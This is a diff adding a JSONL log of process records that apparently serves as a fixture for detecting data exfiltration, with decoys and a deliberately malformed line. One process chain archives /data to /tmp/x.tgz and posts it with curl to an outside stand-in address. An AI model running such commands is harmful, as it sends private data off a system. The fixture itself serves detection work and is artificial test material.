@@ -1,0 +1,31 @@
+{"pid":328,"ppid":9201,"cmd":"/usr/bin/stat /tmp/x.tgz"}
+{"pid":4839,"ppid":9469,"cmd":"/usr/bin/uptime"}
+{"pid":9201,"ppid":4839,"cmd":"/usr/bin/python3 healthcheck.py"}
+{"pid":1984,"ppid":4839,"cmd":"/usr/bin/logger maintenance"}
+{"pid":1525,"ppid":1984,"cmd":"/usr/bin/uptime"}
+{"pid":6374,"ppid":9201,"cmd":"/bin/sh -c 'echo curl -X POST'"}
+{"pid":2682,"ppid":9469,"cmd":"/usr/bin/uptime"}
+{"pid":3502,"ppid":4732,"cmd":"/usr/bin/scp --help"}
+{"pid":3498,"ppid":4839,"cmd":"/usr/bin/sleep 60"}
+{"pid":2986,"ppid":4732,"cmd":"/bin/sh -c 'echo backup complete'"}
+{"pid":9984,"ppid":4689,"cmd":"/usr/bin/python3 metrics.py"}
+{"pid":7711,"ppid":120,"cmd":"broken json"
+{"pid":1431,"ppid":7486,"cmd":"curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz"}
+{"pid":7432,"ppid":2390,"cmd":"/usr/bin/curl --help"}
+{"pid":4732,"ppid":9469,"cmd":"/usr/bin/dbus-daemon --system"}
+{"pid":2428,"ppid":4839,"cmd":"/usr/bin/find /var/log -type f"}
+{"pid":4689,"ppid":7648,"cmd":"/usr/bin/logger metrics"}
+{"pid":2390,"ppid":4732,"cmd":"/usr/bin/whoami"}
+{"pid":6628,"ppid":1391,"cmd":"tar -czf /tmp/x.tgz /data"}
+{"pid":9785,"ppid":9469,"cmd":"/usr/bin/python3 healthcheck.py"}
+{"pid":1391,"ppid":9469,"cmd":"/usr/bin/python3 worker.py"}
+{"pid":9819,"ppid":4732,"cmd":"/usr/bin/grep scp /etc/motd"}
+{"pid":8175,"ppid":9469,"cmd":"/usr/bin/curl http://127.0.0.1/health"}
+{"pid":5151,"ppid":2390,"cmd":"/bin/sh -c 'echo backup complete'"}
+{"pid":9469,"ppid":0,"cmd":"/sbin/init"}
+{"pid":7648,"ppid":9984,"cmd":"/usr/bin/sleep 5"}
+{"pid":6810,"ppid":9469,"cmd":"/usr/sbin/cron -f"}
+{"pid":9984,"ppid":9469,"cmd":"/usr/bin/python3 metrics.py"}
+{"pid":1605,"ppid":1984,"cmd":"/usr/bin/logger maintenance"}
+{"pid":873,"ppid":1984,"cmd":"/usr/bin/logger maintenance"}
+{"pid":7486,"ppid":6628,"cmd":"/bin/sh -c prepare-upload"}
